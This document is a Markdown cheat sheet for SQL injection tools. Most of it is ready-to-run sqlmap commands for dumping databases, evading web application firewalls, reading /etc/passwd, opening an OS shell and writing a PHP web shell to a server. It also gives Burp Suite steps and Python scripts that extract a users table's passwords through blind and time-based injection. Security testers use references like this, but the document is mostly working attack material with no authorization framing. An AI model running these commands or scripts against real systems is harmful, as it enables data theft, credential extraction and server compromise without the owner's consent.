# SQL Injection Automation Tools

## SQLMap

### Basic Usage

```bash
# GET parameter
sqlmap -u "http://target.com/?id=1"

# POST data
sqlmap -u "http://target.com/login" --data="username=admin&password=pass"

# From Burp request file
sqlmap -r request.txt
```

### Database Enumeration

```bash
# Get databases
sqlmap -u "http://target.com/?id=1" --dbs

# Get tables
sqlmap -u "http://target.com/?id=1" -D database_name --tables

# Get columns
sqlmap -u "http://target.com/?id=1" -D database_name -T table_name --columns

# Dump data
sqlmap -u "http://target.com/?id=1" -D database_name -T table_name -C col1,col2 --dump

# Dump all
sqlmap -u "http://target.com/?id=1" --dump-all
```

### Injection Techniques

```bash
# Specify technique
# B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline
sqlmap -u "http://target.com/?id=1" --technique=BEUST

# Time-based only
sqlmap -u "http://target.com/?id=1" --technique=T

# Specify DBMS
sqlmap -u "http://target.com/?id=1" --dbms=mysql
```

### Authentication/Session

```bash
# Cookie
sqlmap -u "http://target.com/?id=1" --cookie="PHPSESSID=abc123"

# Auth header
sqlmap -u "http://target.com/?id=1" --headers="Authorization: Bearer token123"

# HTTP Basic Auth
sqlmap -u "http://target.com/?id=1" --auth-type=basic --auth-cred="user:pass"
```

### Bypass/Evasion

```bash
# WAF bypass tamper scripts
sqlmap -u "http://target.com/?id=1" --tamper=space2comment
sqlmap -u "http://target.com/?id=1" --tamper=between,randomcase

# Common tamper scripts
--tamper=space2comment     # Replace space with /**/
--tamper=between           # Replace > with BETWEEN
--tamper=randomcase        # Random case
--tamper=charencode        # URL encode chars
--tamper=base64encode      # Base64 encode payload
--tamper=space2hash        # Replace space with #\n

# Multiple tampers
--tamper=space2comment,randomcase,between

# Random User-Agent
--random-agent

# Delay between requests
--delay=1

# Proxy
--proxy="http://127.0.0.1:8080"
```

### OS Interaction

```bash
# OS shell (requires privileges)
sqlmap -u "http://target.com/?id=1" --os-shell

# OS command
sqlmap -u "http://target.com/?id=1" --os-cmd="whoami"

# SQL shell
sqlmap -u "http://target.com/?id=1" --sql-shell

# File read
sqlmap -u "http://target.com/?id=1" --file-read="/etc/passwd"

# File write
sqlmap -u "http://target.com/?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### Performance Tuning

```bash
# Threads (faster)
--threads=10

# Skip confirmation prompts
--batch

# Increase detection level
--level=5          # 1-5 (default 1)
--risk=3           # 1-3 (default 1)

# Verbose output
-v 3               # 0-6
```

### Second-Order Injection

```bash
# Specify where result appears
sqlmap -u "http://target.com/vuln" --second-url="http://target.com/result"
```

## Burp Suite

### Manual Testing

1. Capture request in Proxy
2. Send to Repeater (Ctrl+R)
3. Modify parameters with payloads
4. Observe response differences

### Intruder Attack

1. Send request to Intruder
2. Mark injection points
3. Load SQLi payload list
4. Start attack
5. Sort by response length/status

### SQLi Scanner (Pro)

1. Right-click request
2. Scan > Active Scan
3. Review issues in Target > Issues

### Extensions

| Extension | Purpose |
|-----------|---------|
| SQLiPy | SQLMap integration |
| CO2 | SQL/NoSQL injection |
| Hackvertor | Encoding/decoding |
| Param Miner | Hidden parameter discovery |

## Other Tools

### ghauri

SQLMap alternative, handles some edge cases better:

```bash
ghauri -u "http://target.com/?id=1" --dbs
ghauri -r request.txt --batch
```

### NoSQLMap

For NoSQL databases:

```bash
nosqlmap -u http://target.com/api --attack 2
```

### jsql-injection

Java-based GUI:

```bash
java -jar jsql-injection.jar
```

## Custom Scripts

### Python Blind SQLi Template

```python
import requests
import string

url = "http://target.com/vulnerable"
charset = string.ascii_lowercase + string.digits

def check(payload):
    data = {"id": payload}
    r = requests.post(url, data=data)
    return "Welcome" in r.text  # Adjust condition

# Binary search character
def get_char(position):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        payload = f"' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),{position},1))>{mid}--"
        if check(payload):
            low = mid + 1
        else:
            high = mid
    return chr(low)

# Extract string
def extract(length):
    result = ""
    for i in range(1, length + 1):
        result += get_char(i)
        print(f"Found: {result}")
    return result

# First get length, then extract
```

### Time-based Template

```python
import requests
import time

url = "http://target.com/vulnerable"

def check(payload):
    start = time.time()
    requests.get(url, params={"id": payload})
    elapsed = time.time() - start
    return elapsed > 3  # 3 second threshold

# Similar binary search logic
```

## Payload Lists

### PayloadsAllTheThings

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
```

### SecLists

```
https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/SQLi
```

### Common Locations

```
/usr/share/sqlmap/data/txt/
/usr/share/seclists/Fuzzing/SQLi/
```

## Quick Reference

| Task | SQLMap Command |
|------|----------------|
| Basic scan | `sqlmap -u URL` |
| List DBs | `sqlmap -u URL --dbs` |
| List tables | `sqlmap -u URL -D db --tables` |
| Dump table | `sqlmap -u URL -D db -T tbl --dump` |
| OS shell | `sqlmap -u URL --os-shell` |
| File read | `sqlmap -u URL --file-read=/etc/passwd` |
| Bypass WAF | `sqlmap -u URL --tamper=space2comment` |
| Force DBMS | `sqlmap -u URL --dbms=mysql` |
